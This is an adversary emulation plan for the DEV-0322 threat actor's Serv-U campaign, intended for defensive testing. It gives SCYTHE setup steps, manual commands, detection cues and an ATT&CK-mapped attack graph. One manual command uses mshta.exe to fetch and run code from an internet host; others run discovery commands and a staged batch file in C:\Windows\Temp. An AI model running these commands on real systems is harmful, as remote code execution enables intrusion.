# DEV-0322 Adversary Emulation Plan

This threat is based on Microsoft Threat Intelligence Center (MSTIC) report post on July 13, 2021: https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/

## Emulate with SCYTHE
1. Download and import the threat in JSON format to your SCYTHE instance
2. Create a new campaign
3. Import from Existing Threat: DEV-0322
4. Launch Campaign
5. Execute from an EXE

## Emulate manually
Open a command prompt and run these commands:
- ``` C:\Windows\System32\mshta.exe http://<An Internet IP>```
- ```cmd.exe /c whoami > whoami.txt```
- ```cmd.exe /c dir > dir.txt```
- ```cmd.exe /c echo whoami > C:\Windows\Temp\Serv-U.bat```
- ```cmd.exe /c "C:\Windows\Temp\Serv-U.bat"```
- ```powershell.exe "C:\Windows\Temp\Serv-U.bat"```

## Detection & Response
- An executable spawning mshta.exe
- An executable spawning cmd.exe
- An executable spawning powershell.exe
- An executable spawning whoami
- An executable spawning dir
- mshta.exe reaching out to the internet

 #Attack Graph

```mermaid
graph TD
Step0["<b> module: https </b> <br>"]
Step1["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load run </i> <br><a href='https://attack.mitre.org/techniques/T1059.003'>att&ck-technique:T1059.003</a><br>
"]
Step2["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd.exe /c whoami > whoami.txt </i> <br><a href='https://attack.mitre.org/techniques/T1033'>att&ck-technique:T1033</a><br>
"]
Step3["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd.exe /c dir > dir.txt </i> <br><a href='https://attack.mitre.org/techniques/T1083'>att&ck-technique:T1083</a><br>
"]
Step4["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd.exe /c echo whoami > C:\Windows\Temp\Serv-U.bat </i> <br><a href='https://attack.mitre.org/techniques/T1059.003'>att&ck-technique:T1059.003</a><br>
"]
Step5["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd.exe /c C:\Windows\Temp\Serv-U.bat </i> <br><a href='https://attack.mitre.org/techniques/T1033'>att&ck-technique:T1033</a><br>
"]
Step6["<b> module: run </b> <br><h4> parameters: </h4> <i> powershell.exe C:\Windows\Temp\Serv-U.bat </i> <br><a href='https://attack.mitre.org/techniques/T1059.001'>att&ck-technique:T1059.001</a><br>
"]
Step7["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd.exe /c del whoami.txt </i> <br>"]
Step8["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd.exe /c del dir.txt </i> <br>"]
Step9["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd.exe /c del C:\Windows\Temp\Serv-U.bat </i> <br>"]
Step10["<b> module: controller </b> <br><h4> parameters: </h4> <i> --shutdown </i> <br><a href='https://attack.mitre.org/tactics/TA0011'>att&ck-tactic:TA0011</a><br>
<a href='https://attack.mitre.org/techniques/T1219'>att&ck-technique:T1219</a><br>
"]
Step0 --> Step1
Step1 --> Step2
Step2 --> Step3
Step3 --> Step4
Step4 --> Step5
Step5 --> Step6
Step6 --> Step7
Step7 --> Step8
Step8 --> Step9
Step9 --> Step10
Step10 --> Step11
```

